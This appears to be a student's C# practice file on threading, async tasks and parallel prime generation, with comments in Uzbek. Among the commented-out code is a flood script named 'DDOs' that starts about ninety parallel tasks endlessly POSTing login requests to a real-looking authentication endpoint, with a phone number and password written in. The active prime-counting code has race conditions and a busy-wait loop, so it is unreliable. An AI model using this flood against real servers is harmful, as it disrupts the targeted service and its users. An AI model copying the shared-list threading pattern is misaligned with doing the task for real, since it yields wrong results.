#region - Part1
/*
Thread thread = new Thread(SomeTask);
thread.Name = "Custom Thread";
thread.IsBackground = true;
thread.Start();
//thread.Join();
//thread.Abort();
//thread.Suspend();
Console.WriteLine(thread.Name);
Console.WriteLine(thread.ThreadState);
Console.WriteLine(thread.IsAlive);
Console.WriteLine(thread.IsBackground);
Console.WriteLine(thread.ManagedThreadId);
//var res = SomeAsync();

Console.WriteLine("Current thread");
Thread mainThread = Thread.CurrentThread;
mainThread.Name = "main";
Console.WriteLine(mainThread.Name);
Console.WriteLine(mainThread.ManagedThreadId);
Console.WriteLine(mainThread.ThreadState);
Console.WriteLine(mainThread.IsAlive);
Console.WriteLine(mainThread.IsBackground);
Console.WriteLine("\nNext command");
string s = Console.ReadLine();
Console.WriteLine(s);


void SomeTask()
{
    //while(true)
    //{
    //    Console.WriteLine(DateTime.Now);
    //    Thread.Sleep(1000);
    //}
    Thread.Sleep(2000);
}

async Task SomeAsync()
{
    Console.WriteLine("Task started");
    await File.WriteAllLinesAsync("Test.txt", new string[] {"Salom"});
    Thread.Sleep(5000);
    Console.WriteLine("Completed");
}
*/

//using System;
//using System.Collections.Generic;
//using System.Linq;
//using System.Threading.Tasks;

//class Program
//{
//    static void Main()
//    {
//        int start = 1;
//        int end = 100000000; // Replace with your desired range

//        List<int> primes = GeneratePrimes(start, end);

//        foreach (int prime in primes)
//        {
//            Console.WriteLine(prime);
//        }
//    }

//    static List<int> GeneratePrimes(int start, int end)
//    {
//        int numThreads = Environment.ProcessorCount; // You can adjust the number of threads as needed

//        var tasks = new List<Task<IEnumerable<int>>>();

//        for (int i = 0; i < numThreads; i++)
//        {
//            int threadStart = start + (i * (end - start + 1) / numThreads);
//            int threadEnd = i == numThreads - 1 ? end : threadStart + (end - start + 1) / numThreads - 1;

//            tasks.Add(Task.Run(() => PrimesOfRange(threadStart, threadEnd)));
//        }

//        Task.WaitAll(tasks.ToArray());

//        List<int> primes = new List<int>();
//        foreach (var task in tasks)
//        {
//            primes.AddRange(task.Result);
//        }

//        return primes;
//    }

//    static IEnumerable<int> PrimesOfRange(int start, int end)
//    {
//        for (; start <= end; start++)
//        {
//            if (IsPrime(start))
//            {
//                yield return start;
//            }
//        }
//    }

//    static bool IsPrime(int number)
//    {
//        for (int i = 2; i <= Math.Sqrt(number); i++)
//        {
//            if (number % i == 0)
//            {
//                return false;
//            }
//        }

//        return number > 1;
//    }
//}


//using System;
//using System.Net.Http;
//using System.Net.Http.Json;
//using System.Threading.Tasks;

//class Program
//{
//    static async Task Main(string[] args)
//    {
//        while(true)
//        {
//           Task.W(
//                Task.Run(() => DDOs()),
//                Task.Run(() => DDOs()),
//                Task.Run(() => DDOs()),
//                Task.Run(() => DDOs()), 
//                Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs()),
//            Task.Run(() => DDOs())
//            );
//        }

//    }

//    static async Task DDOs()
//    {
//        string url = "https://pos1.1kb.uz/api/Auth/login";
//        string phoneNumber = "+998902927708";
//        string password = "77087708yY!";
//        int a = 0;

//        while (true)
//        {
//            try
//            {
//                using (HttpClient client = new HttpClient())
//                {
//                    var data = new
//                    {
//                        phoneNumber = phoneNumber,
//                        password = password
//                    };

//                    var response = await client.PostAsJsonAsync(url, data);

//                    Console.Write(response.StatusCode + ", ");
//                    a++;
//                }
//            }
//            catch (HttpRequestException e)
//            {
//                // Agar so'rovni jo'natishda xatolik yuzaga kelsa, uni ekranga chiqaramiz
//                Console.WriteLine($"Xatolik: {e.Message}");
//            }

//            // Bir necha sekund o'zgartirishni istaysiz, ulashing:
//            // await Task.Delay(5000); // 5 sekund
//        }
//    }
//}

/*
Console.WriteLine("Program started");

var res = Task.WhenAll(
    GetAsync1(),
    GetAsync2(),
    GetAsync3()
    );
//var res1 = GetAsync1();
//var res2 = GetAsync2();
//var res3 = GetAsync3();


//Task.WaitAll(
//    GetAsync1(),
//    GetAsync2(),
//    GetAsync3()
//    );

Console.WriteLine("Next command:");
Console.ReadLine();

async Task<string> GetAsync1()
{
    HttpClient client = new HttpClient();
    var content = await client.GetStringAsync("https://iiv.uz");
    Console.WriteLine(content);
    return content;
}
async Task GetAsync2()
{
    HttpClient client = new HttpClient();
    var content = await client.GetStringAsync("https://iiv.uz/wanted");
}
async Task GetAsync3()
{
    HttpClient client = new HttpClient();
    var content = await client.GetStringAsync("https://iiv.uz/pages/qollanma-va-terminlar");
}

*/

#endregion

#region - Part2

int n = int.Parse(Console.ReadLine());
List<int> primes = new List<int>();

Thread thread = null;
int start = 1;
int step = 100000;
for (int i = step; i< n; i += step)
{
    thread = new Thread(() 
        => primes.AddRange(PrimesOfRange(start, i)));
    thread.Start();
}

label:
if (thread.ThreadState == ThreadState.Running)
    goto label;

Console.WriteLine("Enter your command:");
Console.WriteLine(primes.Count);

static IEnumerable<int> PrimesOfRange(int start, int end)
{
    for (; start <= end; start++)
    {
        if (IsPrime(start))
        {
            yield return start;
        }
    }
}

static bool IsPrime(int number)
{
    for (int i = 2; i <= Math.Sqrt(number); i++)
    {
        if (number % i == 0)
        {
            return false;
        }
    }

    return number > 1;
}



















#endregion

